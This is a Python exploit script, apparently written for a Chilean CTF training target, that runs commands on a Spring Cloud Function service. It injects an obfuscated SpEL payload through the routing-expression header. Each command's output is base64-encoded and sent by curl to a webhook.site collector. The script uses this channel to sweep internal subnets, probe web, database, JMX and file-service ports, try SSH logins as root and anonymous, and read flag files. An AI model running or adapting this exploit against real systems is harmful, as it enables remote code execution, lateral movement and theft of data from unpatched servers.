#!/usr/bin/env python3
"""
CTF Chile - Escaneo comprehensivo de servicios internos
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Escaneando servicios internos comprehensivamente...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=25)
        print(f"    [+] {tag:35} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] FASE 1: Descubrir todos los hosts activos...")

# Escaneo exhaustivo de hosts en ambas redes
probe("hosts_10_160_209", "for i in {1..10}; do ping -c 1 -W 1 10.160.209.$i 2>/dev/null && echo '10.160.209.'$i' ALIVE'; done")
probe("hosts_10_109_220", "for i in {1..10}; do ping -c 1 -W 1 10.109.220.$i 2>/dev/null && echo '10.109.220.'$i' ALIVE'; done")

print("[*] FASE 2: Escaneo de servicios web...")

# Probar servicios web en puertos comunes
web_ports = [80, 8080, 8443, 9000, 9999, 3000, 5000, 8000]
hosts = ["10.160.209.1", "10.109.220.1", "10.109.220.254"]

for host in hosts:
    for port in web_ports:
        host_safe = host.replace(".", "_")
        probe(f"web_{host_safe}_{port}", f"timeout 8 curl -s -i http://{host}:{port}/ 2>/dev/null | head -10")

print("[*] FASE 3: Escaneo de servicios de bases de datos...")

# Probar bases de datos comunes
db_ports = [3306, 5432, 1433, 27017, 6379]
for host in hosts:
    for port in db_ports:
        host_safe = host.replace(".", "_")
        probe(f"db_{host_safe}_{port}", f"timeout 5 nc -zv {host} {port} 2>&1 | grep -E '(succeeded|open)'")

print("[*] FASE 4: Probando credenciales JMX en servicios JMX...")

# Probar servicios JMX específicos
jmx_ports = [9999, 8686, 1099, 1098]
for host in hosts:
    for port in jmx_ports:
        host_safe = host.replace(".", "_")
        probe(f"jmx_{host_safe}_{port}", f"timeout 5 nc -zv {host} {port} 2>&1")

print("[*] FASE 5: Búsqueda de endpoints de aplicaciones...")

# Probar endpoints comunes de aplicaciones Spring Boot
endpoints = ["/actuator", "/health", "/info", "/env", "/beans", "/configprops"]
for host in hosts:
    for endpoint in endpoints:
        host_safe = host.replace(".", "_")
        endpoint_safe = endpoint.replace("/", "_")
        probe(f"endpoint_{host_safe}_{endpoint_safe}", f"timeout 8 curl -s http://{host}:8080{endpoint} 2>/dev/null | head -5")

print("[*] FASE 6: Exploración de servicios SSH con más métodos...")

# Intentar diferentes métodos de conexión SSH
for host in hosts:
    host_safe = host.replace(".", "_")

    # Probar con keys SSH si existen
    probe(f"ssh_key_{host_safe}", f"timeout 8 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@{host} 'echo SSH_KEY_SUCCESS && hostname' 2>/dev/null || echo 'SSH_KEY_FAILED'")

    # Probar SSH sin password (anonymous)
    probe(f"ssh_anon_{host_safe}", f"timeout 8 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes anonymous@{host} 'echo SSH_ANON_SUCCESS && hostname' 2>/dev/null || echo 'SSH_ANON_FAILED'")

print("[*] FASE 7: Verificación de servicios de archivos...")

# Probar servicios de archivos
file_services = [21, 445, 139, 111, 2049]  # FTP, SMB, NFS
for host in hosts:
    for port in file_services:
        host_safe = host.replace(".", "_")
        probe(f"file_{host_safe}_{port}", f"timeout 5 nc -zv {host} {port} 2>&1")

print("[*] FASE 8: Búsqueda final de flags...")

# Búsqueda más exhaustiva de flags
probe("flag_final_search", "find / \\( -name '*flag*' -o -name '*ctf*' -o -name '*vault*' \\) -type f 2>/dev/null | head -15 | xargs cat 2>/dev/null")

time.sleep(30)

# Recoger y analizar respuestas
print("\n[*] Analizando escaneo comprehensivo...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=50", timeout=20)
data = r.json().get("data", [])

active_hosts = []
web_services = []
open_ports = []
ssh_successes = []
flags_found = []
interesting_endpoints = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 70)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar hosts activos
            if "ALIVE" in decoded:
                hosts = [line.split()[0] for line in decoded.split("\n") if "ALIVE" in line]
                active_hosts.extend(hosts)
                print(f"🖥️  HOST ACTIVO")

            # Detectar servicios web
            if any(keyword in decoded.lower() for keyword in ["http/", "server:", "content-type:"]):
                web_services.append((path, decoded))
                print(f"🌐 SERVICIO WEB DETECTADO")

            # Detectar puertos abiertos
            if any(keyword in decoded.lower() for keyword in ["succeeded", "open", "connected"]):
                open_ports.append((path, decoded))
                print(f"🔓 PUERTO ABIERTO")

            # Detectar SSH exitoso
            if any(keyword in decoded for keyword in ["SSH_KEY_SUCCESS", "SSH_ANON_SUCCESS", "SSH_SUCCESS"]):
                ssh_successes.append((path, decoded))
                print(f"🎉 SSH EXITOSO")

            # Buscar endpoints interesantes
            if any(keyword in decoded.lower() for keyword in ["actuator", "health", "env", "management"]):
                interesting_endpoints.append((path, decoded))
                print(f"🎯 ENDPOINT INTERESANTE")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                flags_found.append((path, decoded))
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen final
print("\n" + "="*70)
print("📊 RESUMEN DEL ESCANEO COMPREHENSIVO")
print("="*70)

if active_hosts:
    print(f"🖥️  HOSTS ACTIVOS: {len(set(active_hosts))}")
    for host in set(active_hosts):
        print(f"    - {host}")

if web_services:
    print(f"\n🌐 SERVICIOS WEB: {len(web_services)}")
    for tag, content in web_services:
        print(f"    - {tag}: {content[:80]}...")

if open_ports:
    print(f"\n🔓 PUERTOS ABIERTOS: {len(open_ports)}")
    for tag, content in open_ports:
        print(f"    - {tag}: {content[:80]}...")

if interesting_endpoints:
    print(f"\n🎯 ENDPOINTS INTERESANTES: {len(interesting_endpoints)}")
    for tag, content in interesting_endpoints:
        print(f"    - {tag}: {content[:80]}...")

if ssh_successes:
    print(f"\n🎉 SSH EXITOSO: {len(ssh_successes)}")
    for tag, content in ssh_successes:
        print(f"    ✅ {tag}: {content[:100]}...")

if flags_found:
    print(f"\n🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
    for tag, flag in flags_found:
        print(f"    🎯 {tag}: {flag}")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")